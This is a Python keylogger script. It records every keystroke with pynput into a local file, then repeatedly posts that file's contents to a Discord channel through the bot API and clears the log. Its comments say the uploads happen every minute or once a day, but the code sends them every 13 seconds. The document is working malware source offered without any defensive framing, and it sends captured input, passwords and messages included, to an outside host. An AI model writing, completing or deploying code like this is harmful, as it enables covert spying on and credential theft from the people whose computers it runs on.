import pynput.keyboard as keyboard
import threading
import time
import requests

# Path to the log file
log_file_path = "key_log.txt"

# Discord bot details
discord_bot_token = 'BOT_TOKEN'
channel_id = 'CHANNEL_ID'

# Function to log keystrokes to a file
def on_press(key):
    try:
        with open(log_file_path, 'a') as log_file:
            # Handle spaces and avoid logging certain keys like Ctrl
            if key == keyboard.Key.space:
                log_file.write(' ')
            elif key == keyboard.Key.enter:
                log_file.write('\n')
            elif key not in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
                log_file.write(key.char)
    except AttributeError:
        pass

# Function to send the log file to Discord
def send_to_discord():
    with open(log_file_path, 'r') as file:
        content = file.read()
        url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
        headers = {
            'Authorization': f'Bot {discord_bot_token}',
            'Content-Type': 'application/json'
        }
        data = {
            'content': f"```\n{content}\n```"
        }
        response = requests.post(url, headers=headers, json=data)
        if response.status_code == 200:
            print("Log file sent successfully")
            clear_log_file()  # Clear the log file after sending
        else:
            print(f"Failed to send log file: {response.status_code}")

# Function to clear the log file
def clear_log_file():
    open(log_file_path, 'w').close()  # This truncates the file

# Function to periodically save logs
def log_saver():
    while True:
        time.sleep(13)  # Save the log every minute

# Function to send the log file once a day
def daily_discord_sender():
    while True:
        time.sleep(13)  # Wait for a day (86400 seconds)
        send_to_discord()

# Set up listeners and start threads
def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    log_thread = threading.Thread(target=log_saver)
    log_thread.start()

    discord_thread = threading.Thread(target=daily_discord_sender)
    discord_thread.start()

# Run the keylogger
if __name__ == "__main__":
    start_keylogger()